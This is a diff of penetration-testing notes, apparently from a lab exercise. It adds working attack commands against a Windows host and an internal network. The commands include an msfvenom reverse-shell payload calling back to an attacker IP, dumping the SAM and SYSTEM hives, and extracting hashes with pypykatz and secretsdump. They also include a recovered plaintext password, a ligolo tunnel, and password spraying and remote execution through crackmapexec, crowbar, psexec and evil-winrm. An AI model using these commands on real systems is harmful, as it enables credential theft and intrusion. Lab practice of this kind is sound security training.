@@ -49,7 +49,6 @@ upload adduser.exe
 shutdown /r /t 0 
 Get-LocalGroupMember administrators
 
-
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=9999 -f exe -o shell.exe
 
 # obtain a has from running admintool.exe
@@ -85,10 +84,49 @@ lsadump::secrets
 %SYSTEMROOT%\System32\config\RegBack\system  
 
 # found in %SYSTEMROOT%\System32\config\SAM  
+# cannot extract hashes however
 cd C:\Windows\System32\config
 download SAM
 download SYSTEM
-pypykatz registry --sam SAM SYSTEM
-impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+reg save hklm\sam C:\Users\Administrator\sam
+reg save hklm\system C:\Users\Administrator\system
+pypykatz registry --sam sam system
+impacket-secretsdump -sam sam -system system
 
+# look in command history - find a password we can use to password spray
+(Get-PSReadlineOption).HistorySavePath
+hghgib6vHT3bVWf
+```
+
+enumerate internal network
+```
+# from kali
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+# from proxy on kali
+>> session
+>> start
+
+# add route to internal network
+sudo ip route add 10.10.110.0/24 dev ligolo
+
+# from windows target
+upload agent.exe
+./agent.exe -ignore-cert -connect 192.168.45.234:11601
+
+```
+
+.154
+```
+nmap -Pn 10.10.110.154
+sudo nmap -sU --open -p 161 -Pn 10.10.110.154
+
+crackmapexec smb 10.10.110.154 -u web_svc -p 'hghgib6vHT3bVWf' --continue-on-success
+crackmapexec winrm 10.10.110.154 -u web_svc -p 'hghgib6vHT3bVWf' --continue-on-success --local-auth
+crowbar -b rdp -s 10.10.110.154/32 -u web_svc -c "hghgib6vHT3bVWf" -n 1
+impacket-mssqlclient web_svc:hghgib6vHT3bVWf@10.10.110.154 -windows-auth
+impacket-psexec web_svc:hghgib6vHT3bVWf@10.10.110.154
+
+evil-winrm -i 10.10.110.154 -u web_svc -p "hghgib6vHT3bVWf"
 ```
